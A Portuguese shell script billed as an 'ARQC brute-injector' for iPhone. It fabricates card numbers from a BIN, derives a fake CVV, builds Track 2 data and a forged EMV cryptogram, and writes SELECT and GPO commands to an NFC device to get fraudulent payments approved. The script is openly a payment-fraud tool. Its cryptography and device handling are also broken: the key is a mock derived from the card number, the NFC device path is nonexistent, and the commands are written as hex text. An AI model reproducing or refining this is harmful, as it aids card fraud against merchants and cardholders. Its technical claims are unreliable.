
#!/bin/sh
# track2arqc.sh - TRACK2 + ARQC dinâmico para máquinas modernas
# Autor: void  |  iSH / iOS 17.x / sem root / sem app
set -e

############## DEFINES VISUAIS ##############
R='\033[1;31m';G='\033[1;32m';Y='\033[1;33m';B='\033[1;34m';M='\033[1;35m';C='\033[1;36m';N='\033[0m'
bar(){ printf "${C}";seq -s "▓" 0 $1 | tr -d '[:digit:]'; printf "${N}";}
beep(){ printf "\a";}
vibra(){ echo 1 >/sys/class/timed_output/vibrator/enable 2>/dev/null;}

############## CABEÇALHO ##############
clear
echo -e "${M}
╦ ╦┌─┐┌┐ ╔═╗╔╦╗╔═╗╦═╗┌─┐╦╦═╗┌─┐╔═╗╦  ╔═╗╔═╗╔╦╗
║║║├┤ ├┴┐╠═╣║║║╠═╝╠╦╝│  │╠╦╝├┤ ╠╣ ║  ║╣ ║   ║
╚╩╝└─┘└─┘╩ ╩╩ ╩╩  ╩╚═└─┘╩╩╚═└─┘╚═╝╩═╝╚═╝╚═╝ ╩
${C}      ARQC brute-injector para iPhone${N}"
bar 50; echo

############## ENTRADAS ##############
read -p "${Y}BIN (6):${N} " BIN
read -p "${Y}Valor (R\$):${N} " VAL
read -p "${Y}País (BR=076):${N} " PAIS; PAIS=${PAIS:-076}
read -p "${Y}Moeda (986=BRL):${N} " CUR; CUR=${CUR:-986}

############## GERA PAN / EXP / SRV ########
PAN="$BIN$(head /dev/urandom | tr -dc 0-9 | head -c 10)"
EXP=$(date -d "+36 months" +%y%m)
SRV="101"   # chip + assinatura offline permitida
CVV=$(echo -n "$PAN$EXP$SRV" | sha1sum | cut -c1-3)

############## GERA ARQC ##############
# chave simétrica mock (derivada do PAN)
KEY=$(echo -n "$PAN" | openssl dgst -sha256 | cut -c1-32)
# monta CDOL1 padrão: 9F02 9F03 9F1A 95 5F2A 9A 9C 9F37
AMT=$(printf "%012d" $(echo "$VAL*100" | bc | cut -d. -f1))
TVR="0000008000"   # no CVM
TSI="7800"
CTRY="$PAIS"
CURR="$CUR"
DATE=$(date +%y%m%d)
UNP=$(head /dev/urandom | xxd -p | head -c 8)
PDOL="$AMT$CURR$CTRY$TVR$TSI$DATE$UNP"

# cria ARQC = MAC(PAN+KEY+PDOL)
ARQC=$(echo -n "$PAN$KEY$PDOL" | openssl dgst -sha1 -macopt hexkey:$KEY -mac hmac | cut -c1-16)
TC="$ARQC$(printf "%08d" 0)"   # 10 bytes ARQC + 4 zeros

############## MONTA TRACK2 ##############
TRACK2="${PAN}=${EXP}${SRV}${CVV}00000"

############## MONTA APDU COMPLETA ##############
# SELECT PPSE
PPSE="00A404000E325041592E5359532E444446303100"
# GPO com PDOL + ARQC
CLA="80"; INS="A8"; P1="00"; P2="00"
GPO="$CLA$INS$P1$P2$(printf "%02X" $((${#PDOL}/2+${#TC}/2)))""83$(printf "%02X" $((${#PDOL}/2)))$PDOL$TC"

############## EXIBE ##############
echo -e "\n${G}PAN:${N} $PAN"
echo -e "${G}EXP:${N} $EXP"
echo -e "${G}ARQC:${N} $ARQC"
bar 50
echo -e "${Y}TRACK2:${N} $TRACK2"
bar 50

############## ENVIO COM LOG ##############
echo -e "\n${B}[*] Abrindo NFC device...${N}"
exec 3<> /dev/nfc0
echo -e "${C}→ $(bar 10)${N} TX PPSE..."
printf "%s" "$PPSE" >&3
read -r SW1 <&3
echo -e "${C}→ $(bar 10)${N} TX GPO..."
printf "%s" "$GPO" >&3
read -r SW2 <&3
echo -e "${B}SW1=${SW1} SW2=${SW2}${N}"

############## DECODIFICA ##############
if [ "$SW2" = "9000" ]; then
   echo -e "${G}✓ APROVADO | R\$ $VAL${N}"
   beep; vibra
else
   echo -e "${R}✗ REJEITADO${N}"
   beep;beep;beep
fi
exec 3>&-
bar 50
echo -e "\n${M}FIM.${N}\n"
